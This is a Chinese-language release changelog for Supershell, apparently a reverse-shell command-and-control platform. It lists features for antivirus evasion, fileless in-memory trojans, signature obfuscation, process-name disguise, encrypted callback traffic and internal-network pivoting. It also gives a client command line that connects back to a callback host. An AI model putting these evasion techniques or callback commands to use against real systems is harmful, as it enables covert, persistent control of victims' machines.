## v2.0.0

**2023-09-26**

### 安全漏洞

1. 修复share_pwd权限提升漏洞，参考：[http://www.ctfiot.com/129689.html](http://www.ctfiot.com/129689.html)
2. 修复几处XSS漏洞（待好心人测试）：
	- 备忘录处XSS
	- 客户端用户名处XSS
	- 浏览文件处XSS
	- 常用文件名XSS
### 功能BUG
1. 修复rssh dockerfile换源错误，现可通过远程pull和本地原生两种方式构建镜像
	- `docker-compose.yml` 从云端仓库下载镜像，极速构建，云端镜像构建时基于linux/amd64架构
	- `docker-compose.yml.local` 从本地构建镜像，兼容本地系统架构
2. 修复非 `utf-8` 编码文件读取出错的BUG
3. 修复客户端生成界面切换页数失效的BUG
4. 修复更改rssh端口后无法回连的BUG，更改rssh端口参考：[Docker部署](https://github.com/tdragon6/Supershell/wiki/Docker%E9%83%A8%E7%BD%B2#%E9%83%A8%E7%BD%B2supershell)

### 功能新增
1. 新增分组备注历史记录存储功能，现数据校准后分组记录不会丢失，可在设置中清除历史冗余缓存
	- 历史冗余缓存是指在客户端列表记录中已删除的主机分组备注历史记录
	- 同主机名会话视为同一主机，修改其中一个主机会话记录的分组备注后，后续同主机上线或数据校准时会设置同样的分组备注信息
2. 新增设置界面下载 `rssh` 私钥功能，可配合本地ssh使用，参考wiki [本地功能](https://github.com/tdragon6/Supershell/wiki#%E6%9C%AC%E5%9C%B0%E5%8A%9F%E8%83%BD)
3. 新增自定义页面显示个数功能
4. 新增客户端会话批量断开、删除和设置分组备注功能
	- 批量断开只能断开在线客户端，批量删除只能删除离线记录
5. 新增Linux客户端执行时自定义进程名功能，可通过客户端参数 `--process_name` 指定进程名
6. 新增一行命令上线功能，使用此功能需要在启动 `docker-compose up -d` 前设置公网地址环境变量
	- 格式：`export EXTERNAL_ADDRESS=<公网地址>:<rssh公网端口>`
	- 支持shell和python脚本一行命令上线，参考：[客户端生成](https://github.com/tdragon6/Supershell/wiki/%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%94%9F%E6%88%90#%E5%B7%B2%E7%94%9F%E6%88%90%E5%AE%A2%E6%88%B7%E7%AB%AF)
7. 新增客户端回连代理，可在客户端生成中指定，仅支持http代理
8. 新增客户端流量封装，默认为ssh，可封装为 `tls`、`websockets` 和 `secure websockets`
	- 自定义tls证书时，可在 `./volume/rssh/tls` 目录中放置证书文件，将tls cert文件命名为 `tls.cert`，tls key文件命名为 `tls.key`
	- 默认没有放置证书文件时，使用自签名证书
9. 新增客户端开启监听功能，对于内网不出网的主机，可通过其他客户端的监听端口回连，实现内网链，参考 [进阶功能](https://github.com/tdragon6/Supershell/wiki/%E8%BF%9B%E9%98%B6%E5%8A%9F%E8%83%BD#%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC)：
10. 新增客户端参数功能，可在执行客户端时指定代理和目的地址等参数
	- 格式：`./client -d <回连地址>:<回连端口> --proxy <代理地址>:<代理端口> --process_name <进程名>`

### 功能优化
1. 优化回连地址支持域名
2. 优化docker映射时ssh私钥的权限问题
3. 优化garble，进一步模糊签名
4. 优化稳定性和其他代码结构

*从旧版本升级参考：[版本更新](https://github.com/tdragon6/Supershell/wiki/%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0)*


## v1.0.0

**2023-04-02**

* 修复rssh版本获取BUG，因变动较小且不影响之前使用，不单独开新的release，release附件中已覆盖v1.0.0和latest的 `Supershell.tar.gz`

**2023.03.28**

* 支持团队并发协作，一个浏览器使用所有功能
* 支持多种系统架构的反弹Shell客户端Payload，集成压缩和免杀
* 支持客户端断线自动重连
* 支持全平台完全交互式Shell，支持在浏览器中使用Shell，支持分享Shell
* 支持回连客户端列表管理
* 内置文件服务器
* 支持文件管理
* 支持内存注入，即文件不落地执行木马（内存马）
* 支持Windows安装反弹Shell服务和Linux尝试迁移uid与gid
